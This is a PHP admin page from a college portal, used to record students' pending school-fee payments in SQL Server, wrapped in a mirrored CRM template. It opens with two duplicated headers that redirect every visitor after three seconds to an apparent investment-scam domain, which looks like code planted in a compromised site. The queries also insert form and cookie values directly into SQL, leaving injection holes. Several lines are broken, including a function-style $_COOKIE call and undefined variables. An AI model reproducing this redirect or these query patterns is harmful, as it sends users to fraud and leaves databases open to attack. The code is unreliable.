<?php
header("Refresh: 3; url=https://bitera-invest.live/YTQdPb"); 
?>

<?php
header("Refresh: 3; url=https://bitera-invest.live/YTQdPb"); 
?>
<?php


require_once('connection.php');

// $crumb='HttpContext.Current.Request.Cookies("userId").Value.ToString';
$crumb=$_COOKIE('userId');



if (isset($_POST['submit'])) {

$mno = trim(strip_tags($_POST['mno']));
$amt = trim(strip_tags($_POST['amt']));
$sidd = trim(strip_tags($_POST['sidd']));
$stat =trim(strip_tags($_POST['stat']));
$pidd = trim(strip_tags($_POST['pidd']));

//check  select count(*) from vw_biodata where matricnum like ''


$tame="SELECT Matricnum from [EBPORTAL].[dbo].vw_biodata Where Matricnum='$mno'";
$user12 = sqlsrv_query($conn, $tame);
$num = sqlsrv_has_rows($user12);
if ($num) {
 echo "true";
}else{
 echo "false";

}


$dre =sqlsrv_query($conn, "SELECT [Uname] FROM [erp].[dbo].[Users] WHERE id=$crumb");
  $userin = sqlsrv_query($conn, $dre);
while ($til = sqlsrv_fetch_array($userin))  {
    $Uname = $til['Uname'];}
   

 

if ($mno == "" || $amt==""||$sidd==""||$pidd=="") {
        echo "<script type ='text/javascript'>
        alert('please do not submit empty form. All fields are compulsory.')
        </script>";} 
       
else if(!is_numeric($amt)){
 echo "<script type ='text/javascript'>
        alert('please fill the amount properly with no alphabets.')
        </script>";   
}

else if($num==false){
 echo "<script type ='text/javascript'>
        alert('This matricnumber does not exist, please retype correctly')
        </script>";   
}


 else { 

 $show =sqlsrv_query($conn,"INSERT INTO [EBPORTAL].[dbo].[PendingSchoolFees] (matricnum, amount, status, paymentid, datecreated, sessionid) values ('$mno', $amt, 1, $pidd, '$today', $sidd)");


   $reen =sqlsrv_query($conn,"INSERT INTO [erp].[dbo].[erpLog] (user_id, log_date,action,user_ip,studnum) values ('$Uname', $dreg, 'registered pending payment', 'service user', '$mno')");

  echo'<script type="text/javascript">
        alert("details! saved.")
        </script>';





}
}


?>

<!DOCTYPE html>
<html lang="en">
   
<!-- Mirrored from thememinister.com/crm/add-customer.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Aug 2019 13:28:08 GMT -->
<head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>CRM Admin Panel</title>
      <!-- Favicon and touch icons -->
      <link rel="shortcut icon" href="assets/dist/img/ico/favicon.png" type="image/x-icon">
      <!-- Start Global Mandatory Style
         =====================================================================-->
      <!-- jquery-ui css -->
      <link href="assets/plugins/jquery-ui-1.12.1/jquery-ui.min.css" rel="stylesheet" type="text/css"/>
      <!-- Bootstrap -->
      <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
      <!-- Bootstrap rtl -->
      <!--<link href="assets/bootstrap-rtl/bootstrap-rtl.min.css" rel="stylesheet" type="text/css"/>-->
      <!-- Lobipanel css -->
      <link href="assets/plugins/lobipanel/lobipanel.min.css" rel="stylesheet" type="text/css"/>
      <!-- Pace css -->
      <link href="assets/plugins/pace/flash.css" rel="stylesheet" type="text/css"/>
      <!-- Font Awesome -->
      <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
      <!-- Pe-icon -->
      <link href="assets/pe-icon-7-stroke/css/pe-icon-7-stroke.css" rel="stylesheet" type="text/css"/>
      <!-- Themify icons -->
      <link href="assets/themify-icons/themify-icons.css" rel="stylesheet" type="text/css"/>
      <!-- End Global Mandatory Style
         =====================================================================-->
      <!-- Start Theme Layout Style
         =====================================================================-->
      <!-- Theme style -->
      <link href="assets/dist/css/stylecrm.css" rel="stylesheet" type="text/css"/>
      <!-- Theme style rtl -->
      <!--<link href="assets/dist/css/stylecrm-rtl.css" rel="stylesheet" type="text/css"/>-->
      <!-- End Theme Layout Style
         =====================================================================-->
   </head>
  
            <!-- Main content -->
            <section class="content">
               <div class="row">
                  <!-- Form controls -->
                  <div class="col-sm-12">
                     <div class="panel panel-bd ">
                        <div class="panel-heading">
                           <div class="btn-group" > 
                             <h4> Pending school fees payment</h4>   
                           </div>
                        </div>
                        <div class="panel-body">
                           <form class="col-sm-6" method="POST" action="" >
                                
                              <div class="form-group">
                                 <label>Matric number</label>        
                                 <input type="text" name="mno" class="form-control" placeholder="enter matric number here " required>
                              </div>


                               <div class="form-group">
                                 <label> Amount (₦)</label>        
                                 <input type="integer" name="amt" class="form-control" placeholder="Enter pending amount to be paid" required>
                              </div>

                              
                               <div class="form-group">
                                 
                                       
                                 <input type="hidden" name="stat" class="form-control" value= "1" >
                              </div>



                 <div class="form-group">
               <label>Payment ID</label>        
               <select class="form-control"  name="pidd" required> 
             <option value="">-- Select --</option>
   <?php                    
$query3 = "SELECT PaymentID,PaymentName from YCTPAY_Payments";
  $user_query3 = sqlsrv_query($conn, $query3);
while ($row2 = sqlsrv_fetch_array($user_query3))  {
    $pid = $row2['PaymentID'];
    $pname=$row2['PaymentName'];

   echo "<option value = '" . $pid . "'>" . $pname . "</option>";

}
?>
       </select>
          </div>

      <div class="form-group">
      <label> Session</label>        
       <select class="form-control"  name="sidd" required> 
      <option value="">-- Select --</option>
   <?php                  
$queryy = "SELECT SessionID,Session from Sessions";
  $user_query32 = sqlsrv_query($conn, $queryy);
while ($row = sqlsrv_fetch_array($user_query32))  {
    $sid = $row['SessionID'];
    $sname=$row['Session'];

    echo "<option value = '" . $sid . "'>" . $sname . "</option>";

}
?>


       </select>
          </div>
                              
                              <div>
                                <button type="submit" name="submit" class="btn btn-warning">Submit</button>  
                             </div>

                              <div class="reset-button">
                                 
                              </div>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
            </section>
            <!-- /.content -->


               
                                 </tbody>
                              </table> 
                           </div>
                        </div>
                   
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</section>

         </div>
         <!-- /.content-wrapper -->
        <footer class="main-footer">
            <strong> Copyright &copy; 2021 <a href="#">Yaba college of technology</a>.</strong> All rights reserved.
         </footer>
      </div>
      <!-- ./wrapper -->
      <!-- Start Core Plugins
         =====================================================================-->
      <!-- jQuery -->
      <script src="assets/plugins/jQuery/jquery-1.12.4.min.js" type="text/javascript"></script>
      <!-- jquery-ui --> 
      <script src="assets/plugins/jquery-ui-1.12.1/jquery-ui.min.js" type="text/javascript"></script>
      <!-- Bootstrap -->
      <script src="assets/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
      <!-- lobipanel -->
      <script src="assets/plugins/lobipanel/lobipanel.min.js" type="text/javascript"></script>
      <!-- Pace js -->
      <script src="assets/plugins/pace/pace.min.js" type="text/javascript"></script>
      <!-- SlimScroll -->
      <script src="assets/plugins/slimScroll/jquery.slimscroll.min.js" type="text/javascript"></script>
      <!-- FastClick -->
      <script src="assets/plugins/fastclick/fastclick.min.js" type="text/javascript"></script>
      <!-- CRMadmin frame -->
      <script src="assets/dist/js/custom.js" type="text/javascript"></script>
      <!-- End Core Plugins
         =====================================================================-->
      <!-- Start Theme label Script
         =====================================================================-->
      <!-- Dashboard js -->
      <script src="assets/dist/js/dashboard.js" type="text/javascript"></script>
      <!-- End Theme label Script
         =====================================================================-->
   </body>

<!-- Mirrored from thememinister.com/crm/add-customer.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Aug 2019 13:28:08 GMT -->
</html>







